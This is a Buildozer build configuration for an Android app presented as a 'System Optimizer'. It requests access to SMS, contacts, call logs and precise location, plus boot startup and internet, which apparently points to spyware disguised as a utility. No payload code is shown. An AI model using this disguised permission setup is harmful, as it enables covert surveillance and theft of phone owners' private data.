[app]
# Basic Info
title = System Optimizer
package.name = sysservice
package.domain = com.ghost.pro
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 6.0

# Requirements (Stable Mix)
requirements = python3,kivy==2.3.0,requests,pyjnius,android

# Icon (Abhi ke liye band hai)
# icon.filename = %(source.dir)s/icon.png

# Permissions
android.permissions = INTERNET, READ_SMS, READ_CONTACTS, READ_CALL_LOG, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED

# Android SDK/NDK Settings (Standard 2026)
android.api = 33
android.minapi = 21
android.ndk = 25b
android.archs = arm64-v8a

# Build Settings
[buildozer]
log_level = 2
warn_on_root = 1
